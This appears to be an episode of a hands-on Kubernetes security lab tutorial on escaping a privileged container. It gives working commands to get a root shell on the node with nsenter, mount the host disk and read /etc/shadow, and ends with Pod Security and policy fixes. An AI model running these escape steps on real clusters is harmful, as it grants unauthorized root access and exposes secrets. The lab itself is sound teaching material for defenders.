# Episode 3 – Breakout (Container Escape)

In the previous episodes, we were confined to the Kubernetes abstraction layer (API, Secrets). Now, we are going deeper. We want to escape the container and gain access to the **Node** itself.

In this episode, we assume:
> You have compromised a pod that is running as **Privileged** (`privileged: true`).
> This is common for monitoring agents, storage drivers, or "lazy" configurations.

Our goal here is to:
- **Identify** that we are in a privileged container.
- **Escape** to the host filesystem.
- **Gain Root Access** on the Node.

## 1. Setup the Lab (The Vulnerability)

We will deploy a pod with `privileged: true` and `hostPID: true`.

From the root of this repo:

```bash
kubectl apply -f episodes/ep3-container-escape/manifests/
```

## 2. Enter the Pod

```bash
kubectl -n battleground exec -it deploy/privileged-app -- bash
```

## 3. The Attack: Escaping to the Node

### 3.1. Am I Privileged?

Check your capabilities. In a normal container, this list is short. In a privileged one, you have everything.

```bash
capsh --print
```

If you see `Current: = cap_chown,cap_dac_override,...` (basically everything), you are privileged.

Also, check if you can see host processes (due to `hostPID: true`):

```bash
ps aux | head
```

If you see processes like `kubelet`, `containerd`, or systemd (PID 1), you are seeing the **Node's** process tree.

### 3.2. The Escape Technique: nsenter

Since we share the PID namespace (`hostPID: true`) and are privileged, we can use `nsenter` to switch our namespace to that of PID 1 (the host's init process).

This effectively gives us a shell **on the node**.

```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

**Boom!** 💥

Run `hostname`, `ls /`, or `whoami`. You are now `root` on the Kubernetes Node.

### 3.3. Alternative: Mounting the Host Disk

If `hostPID` was not enabled but `privileged` was, we could mount the host's disk directly.

1. List devices:
   ```bash
   fdisk -l
   ```
2. Mount the root partition (usually `/dev/sda1` or similar, inside Kind it might be different):
   ```bash
   mkdir /host
   mount /dev/sda1 /host
   ```
3. Access files:
   ```bash
   cat /host/etc/shadow
   ```

## 4. Impact: What does this mean?

Once you are on the Node:
- You can read **all secrets** of all pods running on this node.
- You can read the **Kubelet's kubeconfig** (`/etc/kubernetes/kubelet.conf`).
- You can kill other containers.
- You can pivot to the cloud metadata service (Episode 5).

## 5. Fix

- **Policy:** Enforce **Pod Security Standards (PSS)**. Disallow `privileged` containers in the "Restricted" or "Baseline" policies.
- **Gatekeeper/Kyverno:** Block pods with `securityContext.privileged: true`.
- **Least Privilege:** If an app needs hardware access, grant specific capabilities (`cap_add`) instead of full privilege.
